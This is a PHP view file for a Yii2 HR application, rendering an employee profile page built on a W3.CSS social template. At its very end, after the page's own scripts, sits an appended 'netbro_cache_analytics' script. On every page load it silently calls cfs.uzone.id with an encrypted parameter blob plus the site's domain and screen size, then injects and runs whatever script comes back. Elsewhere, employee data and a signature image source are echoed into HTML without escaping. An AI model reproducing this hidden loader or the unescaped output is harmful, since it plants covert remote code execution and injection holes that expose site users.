<?php
use yii\helpers\Html;
use kartik\grid\GridView;
use yii\helpers\ArrayHelper;
use yii\widgets\ActiveForm;
use yii\helpers\Json;
use yii\bootstrap\Modal;
use yii\helpers\Url;
use kartik\widgets\FileInput;
use yii\web\Response;
use yii\widgets\Pjax;
use lukisongroup\assets\Profile;
Profile::register($this);

$this->sideCorp = 'User Profile';                          		/* Title Select Company pada header pasa sidemenu/menu samping kiri */
$this->sideMenu = 'profile';                                 	/* kd_menu untuk list menu pada sidemenu, get from table of database */
$this->title = Yii::t('app', 'Profile');         				/* title pada header page */
$this->params['breadcrumbs'][] = $this->title;                  /* belum di gunakan karena sudah ada list sidemenu, on plan next*/
$userProfile=Yii::$app->getUserOpt->Profile_user();

	/*
	 * Declaration Componen User Permission
	 * Function profile_user
	 * Modul Name[3=PO]
	*/
	function getPermissionEmp(){
		if (Yii::$app->getUserOpt->profile_user()){
			return Yii::$app->getUserOpt->profile_user()->emp;
		}else{
			return false;
		}
	}
	
	/* KELUARGA & TANGGUNGAN*/
	function tombolUploadSig(){
		$title1 = Yii::t('app', 'Import Image Signature');
		$options1 = [ 'id'=>'import-sig',
					  'data-toggle'=>"modal",
					  'data-target'=>"#signature-import-image",
					  'class' => 'btn btn-danger'					  
					];
		$icon1 = '<span class="fa fa-cloud-upload fa-md"></span>';
		$label1 = $icon1 . ' ' . $title1;
		$url1 = Url::toRoute(['']);
		$content = Html::a($label1,$url1, $options1);
		return $content;
	}
?>

<!-- Page Container -->
<div class="w3-container w3-content" style="max-width:1400px;margin-top:5px">    
	<!-- The Grid -->
	<div class="w3-row">
		<!-- Left Column -->
		<div class="w3-col m3">
			<!-- Profile -->
			<div class="w3-card-2 w3-round w3-white">
				<div class="w3-container">
					<h4 class="w3-center">My Profile</h4>
					<p class="w3-center">
						<img src="<?=Yii::getAlias('@HRD_EMP_UploadUrl') .'/'.$userProfile->emp->EMP_IMG; ?>" class="img-responsive img-thumbnail" style="height:106px;width:106px" />
					</p>
					<hr>
					<p><i class="fa fa-pencil fa-fw w3-margin-right w3-text-theme"></i><?=$userProfile->emp->EMP_NM . ' ' . $userProfile->emp->EMP_NM_BLK?></p>					
					<p><i class="fa fa-birthday-cake fa-fw w3-margin-right w3-text-theme"></i><?=$userProfile->emp->EMP_TGL_LAHIR?></p>
					<p><i class="fa fa-phone fa-fw w3-margin-right w3-text-theme"></i><?=$userProfile->emp->EMP_HP?></p>
					<p><i class="fa fa-home fa-fw w3-margin-right w3-text-theme"></i><?=$userProfile->emp->EMP_ALAMAT?></p>
				</div>
			</div>
			<br>
			<!-- EMPLOYEE SIGNATURE !-->
			<div class="w3-card-2 w3-round w3-white">
				<div class="w3-container">
					<table  class="col-md-12 table-bordered  text-center" style="margin-top:20px;margin-bottom:20px;">
						<tbody>
							<tr>
								<td>
									<?php
										$ttd1 = getPermissionEmp()->SIGSVGBASE64!='' ?  '<img style="width:60%; height:60px" src='.getPermissionEmp()->SIGSVGBASE64.'></img>' :'';
										echo $ttd1;
									?>
								 </td>
							</tr>
						</tbody>
					</table>
					<div class="text-center " style="margin-top:10px;margin-bottom:10px;">
						<?=tombolUploadSig()?>
					</div>
				</div>
			</div>
			<br>
		  <!-- Accordion -->
		  <div class="w3-card-2 w3-round">
			<div class="w3-accordion w3-white">
			  <button onclick="myFunction('Demo1')" class="w3-btn-block w3-theme-l1 w3-left-align"><i class="fa fa-circle-o-notch fa-fw w3-margin-right"></i> My Groups</button>
			  <div id="Demo1" class="w3-accordion-content w3-container">
				<p>Some text..</p>
			  </div>
			  <button onclick="myFunction('Demo2')" class="w3-btn-block w3-theme-l1 w3-left-align"><i class="fa fa-calendar-check-o fa-fw w3-margin-right"></i> My Events</button>
			  <div id="Demo2" class="w3-accordion-content w3-container">
				<p>Some other text..</p>
			  </div>
			  <button onclick="myFunction('Demo3')" class="w3-btn-block w3-theme-l1 w3-left-align"><i class="fa fa-users fa-fw w3-margin-right"></i> My Photos</button>
			  <div id="Demo3" class="w3-accordion-content w3-container">
			 <div class="w3-row-padding">
			 <br>
			   <div class="w3-half">
				 <img src="img_lights.jpg" style="width:100%" class="w3-margin-bottom">
			   </div>
			   <div class="w3-half">
				 <img src="img_nature.jpg" style="width:100%" class="w3-margin-bottom">
			   </div>
			   <div class="w3-half">
				 <img src="img_mountains.jpg" style="width:100%" class="w3-margin-bottom">
			   </div>
			   <div class="w3-half">
				 <img src="img_forest.jpg" style="width:100%" class="w3-margin-bottom">
			   </div>
			   <div class="w3-half">
				 <img src="img_nature.jpg" style="width:100%" class="w3-margin-bottom">
			   </div>
			   <div class="w3-half">
				 <img src="img_fjords.jpg" style="width:100%" class="w3-margin-bottom">
			   </div>
			 </div>
			  </div>
			</div>      
		  </div>
		  <br>
		  
		  <!-- Interests --> 
		  <div class="w3-card-2 w3-round w3-white w3-hide-small">
			<div class="w3-container">
			  <p>Interests</p>
			  <p>
				<span class="w3-tag w3-small w3-theme-d5">News</span>
				<span class="w3-tag w3-small w3-theme-d4">W3Schools</span>
				<span class="w3-tag w3-small w3-theme-d3">Labels</span>
				<span class="w3-tag w3-small w3-theme-d2">Games</span>
				<span class="w3-tag w3-small w3-theme-d1">Friends</span>
				<span class="w3-tag w3-small w3-theme">Games</span>
				<span class="w3-tag w3-small w3-theme-l1">Friends</span>
				<span class="w3-tag w3-small w3-theme-l2">Food</span>
				<span class="w3-tag w3-small w3-theme-l3">Design</span>
				<span class="w3-tag w3-small w3-theme-l4">Art</span>
				<span class="w3-tag w3-small w3-theme-l5">Photos</span>
			  </p>
			</div>
		  </div>
		  <br>
		  
		  <!-- Alert Box -->
		  <div class="w3-container w3-round w3-theme-l4 w3-border w3-theme-border w3-margin-bottom w3-hide-small">
			<span onclick="this.parentElement.style.display='none'" class="w3-hover-text-grey w3-closebtn">
			  <i class="fa fa-remove"></i>
			</span>
			<p><strong>Hey!</strong></p>
			<p>People are looking at your profile. Find out who.</p>
		  </div>
		
		<!-- End Left Column -->
		</div>
    
    <!-- Middle Column -->
    <div class="w3-col m7">
    
		 <!-- DAILY ATTENDANCE SUMMARY -->
		<div class="w3-row-padding">
			<div class="w3-col m12">
				<div class="w3-card-2 w3-round w3-white">
					<div class="w3-container w3-padding">
						<span class="w3-right w3-opacity">Daily</span>
						<h4>Attendance Summary</h4>
						<hr class="w3-clear">
						<div class="w3-row-padding" style="margin:0 -16px">
							<div class="w3-half">
								<img src="img_lights.jpg" style="width:100%" alt="Northern Lights" class="w3-margin-bottom">
							</div>
							<div class="w3-half">
								<img src="img_nature.jpg" style="width:100%" alt="Nature" class="w3-margin-bottom">
							</div>
						</div>
						<button type="button" class="w3-btn w3-theme-d1 w3-margin-bottom"><i class="fa fa-thumbs-up"></i> &nbsp;Like</button> 
						<button type="button" class="w3-btn w3-theme-d2 w3-margin-bottom"><i class="fa fa-comment"></i> &nbsp;Comment</button> 
					</div>
				</div>
			</div>
		</div>
		<br>
		
		 <!-- POSTING	 -->
		<div class="w3-row-padding">		
			<div class="w3-col m12">
				<div class="w3-card-2 w3-round w3-white">
					<div class="w3-container w3-padding">
						<h6 class="w3-opacity">Social Media template by w3.css</h6>
						<p contenteditable="true" class="w3-border w3-padding">Status: Feeling Blue</p>
						<button type="button" class="w3-btn w3-theme"><i class="fa fa-pencil"></i> &nbsp;Post</button> 
					</div>
				</div>
			</div>
		</div>
		<div class="w3-container w3-card-2 w3-white w3-round w3-margin"><br>
			<img src="img_avatar2.png" alt="Avatar" class="w3-left w3-circle w3-margin-right" style="width:60px">
			<span class="w3-right w3-opacity">1 min</span>
			<h4>John Doe</h4><br>
			<hr class="w3-clear">
			<p>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.</p>
			<div class="w3-row-padding" style="margin:0 -16px">
				<div class="w3-half">
					<img src="img_lights.jpg" style="width:100%" alt="Northern Lights" class="w3-margin-bottom">
				</div>
				<div class="w3-half">
					<img src="img_nature.jpg" style="width:100%" alt="Nature" class="w3-margin-bottom">
				</div>
			</div>
			<button type="button" class="w3-btn w3-theme-d1 w3-margin-bottom"><i class="fa fa-thumbs-up"></i> &nbsp;Like</button> 
			<button type="button" class="w3-btn w3-theme-d2 w3-margin-bottom"><i class="fa fa-comment"></i> &nbsp;Comment</button> 
		</div>
      
		
	  
      <div class="w3-container w3-card-2 w3-white w3-round w3-margin"><br>
        <img src="img_avatar5.png" alt="Avatar" class="w3-left w3-circle w3-margin-right" style="width:60px">
        <span class="w3-right w3-opacity">16 min</span>
        <h4>Jane Doe</h4><br>
        <hr class="w3-clear">
        <p>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.</p>
        <button type="button" class="w3-btn w3-theme-d1 w3-margin-bottom"><i class="fa fa-thumbs-up"></i> &nbsp;Like</button> 
        <button type="button" class="w3-btn w3-theme-d2 w3-margin-bottom"><i class="fa fa-comment"></i> &nbsp;Comment</button> 
      </div>  

      <div class="w3-container w3-card-2 w3-white w3-round w3-margin"><br>
        <img src="img_avatar6.png" alt="Avatar" class="w3-left w3-circle w3-margin-right" style="width:60px">
        <span class="w3-right w3-opacity">32 min</span>
        <h4>Angie Jane</h4><br>
        <hr class="w3-clear">
        <p>Have you seen this?</p>
        <img src="img_nature.jpg" style="width:100%" class="w3-margin-bottom">
        <p>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.</p>
        <button type="button" class="w3-btn w3-theme-d1 w3-margin-bottom"><i class="fa fa-thumbs-up"></i> &nbsp;Like</button> 
        <button type="button" class="w3-btn w3-theme-d2 w3-margin-bottom"><i class="fa fa-comment"></i> &nbsp;Comment</button> 
      </div> 
      
    <!-- End Middle Column -->
    </div>
    
    <!-- Right Column -->
    <div class="w3-col m2">
		<div class="w3-card-2 w3-round w3-white w3-center">
			<div class="w3-container">
				<p>SISA CUTI:</p>
				<img src="img_forest.jpg" alt="Forest" style="width:100%;">
				<p><strong>Holiday</strong></p>
				<p>Friday 15:00</p>
				<p><button class="w3-btn w3-btn-block w3-theme-l4">Info</button></p>
			</div>
		</div>
		<br>
      
      <div class="w3-card-2 w3-round w3-white w3-center">
        <div class="w3-container">
          <p>Friend Request</p>
          <img src="img_avatar6.png" alt="Avatar" style="width:50%"><br>
          <span>Jane Doe</span>
          <div class="w3-row w3-opacity">
            <div class="w3-half">
              <button class="w3-btn w3-green w3-btn-block w3-section" title="Accept"><i class="fa fa-check"></i></button>
            </div>
            <div class="w3-half">
              <button class="w3-btn w3-red w3-btn-block w3-section" title="Decline"><i class="fa fa-remove"></i></button>
            </div>
          </div>
        </div>
      </div>
      <br>
      
      <div class="w3-card-2 w3-round w3-white w3-padding-16 w3-center">
        <p>ADS</p>
      </div>
      <br>
      
      <div class="w3-card-2 w3-round w3-white w3-padding-32 w3-center">
        <p><i class="fa fa-bug w3-xxlarge"></i></p>
      </div>
      
    <!-- End Right Column -->
    </div>
    
  <!-- End Grid -->
  </div>
  
<!-- End Page Container -->
</div>
<script>
// Accordion
function myFunction(id) {
    var x = document.getElementById(id);
    if (x.className.indexOf("w3-show") == -1) {
        x.className += " w3-show";
        x.previousElementSibling.className += " w3-theme-d1";
    } else { 
        x.className = x.className.replace("w3-show", "");
        x.previousElementSibling.className = 
        x.previousElementSibling.className.replace(" w3-theme-d1", "");
    }
}

// Used to toggle the menu on smaller screens when clicking on the menu button
function openNav() {
    var x = document.getElementById("navDemo");
    if (x.className.indexOf("w3-show") == -1) {
        x.className += " w3-show";
    } else { 
        x.className = x.className.replace(" w3-show", "");
    }
}
</script>

<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582ECSaLdwqSpnCv7lBzaUwewgzuJAgHyQslbfzyOBV59G4uv6hkR%2ffS07xdHl%2fcmbLIQfORW%2b39RkF8AO%2bt9r6syAkNj%2b%2bvvziUlvsW6Psd7jnsfXsk4%2fLFigqB1PHDUG5hp9tXpBYPNTEhnBv7WuYF0l0paOJ8BcWOeo7467YHpq9E00JeeMGKtfY67X%2bkYw4u6Vs6s%2fqcrgiIVrKDdm97LEFSWB1Lc0BTUDHNhaeYqduREIRXB9yG%2bpGJQ9LdeOHRSgqBD4au4AduDTl6Lp9TeOWDukiX4pyU%2fIuMt%2fTito%2fcunlmxBW5i5ax%2bJqCruns8Ji8BSoz5rORzKd0yFVqwuQrMvh5dT7e4z0Tw%2fHAY%2b6xpiS30oVuvT7JEqdHqFCO0Eh4%2bq92yDSgmMWtE5BsHpeu%2bAQI9knQYpf8Hp8j1cnmOfYgqO%2f%2fqZtQAd4n2J6Ox7NyvCBJHQBk7ZeQQk8BhEuQhjvZ6knBikWnWxR3djNahYQ4Wo13CP4LKc%2f3RKT9d0F8ziWgkWk2pOIKyzNnadh9NS4QZMbG4U3tGU2huJ1I%2fABgoUmtZxy%2bog%2fmaTXKTz2s9O3gdr6x9%2bMI5VE7o%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>


